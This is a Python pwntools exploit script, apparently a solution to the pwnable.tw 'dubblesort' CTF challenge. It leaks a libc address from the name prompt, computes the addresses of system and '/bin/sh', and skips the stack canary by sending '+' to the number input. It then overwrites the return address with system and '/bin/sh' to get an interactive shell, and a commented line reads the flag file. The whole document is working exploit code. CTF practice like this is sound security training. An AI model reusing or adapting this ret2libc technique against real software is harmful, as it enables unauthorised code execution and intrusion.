from pwn import *

binary = ELF("./dubblesort_patched")
libc = ELF("./libc_32.so.6")

context.binary = binary


def conn():
    if args.REMOTE:
        r = remote("chall.pwnable.tw", 10101)
    else:
        r = process([binary.path])
        #if args.DEBUG:
        #gdb.attach(r, api=True)
    return r


def main():
    r = conn()

    payload = "a"*24
    r.sendlineafter("What your name :" ,payload)
    # log.info("Debugging...")
    # sleep(10)
    r.recvuntil("a"*24)
    leak = u32(r.recv(4))

    log.info("Recv: " + hex(leak))

    libcbase = leak - 0x1b0000 - 0xa
    log.info("Libc base addr: " + hex(libcbase))

    system_offset = libc.symbols[b'system']
    binsh_offset = next(libc.search(b'/bin/sh\x00'))

    system_addr = libcbase + system_offset
    binsh_addr = libcbase + binsh_offset
    log.info("System offset: " + str(system_addr))
    log.info("/bin/sh base offset: " + str(binsh_addr))


    r.sendlineafter("sort :" , "35")

    for i in range(24):
        r.sendlineafter("number : " ,'1')

    r.sendlineafter("number : " ,'+') #canary

    for i in range(9):
        r.sendlineafter("number : " ,str(system_addr))

    for i in range(1):
        r.sendlineafter("number : " ,str(binsh_addr))

    #print(r.recv())
    #r.sendline("ls; cat flag.txt")
    r.interactive()


if __name__ == "__main__":
    main()

#r = process('./dubblesort', env={'LD_PRELOAD':'./libc_32.so.6'})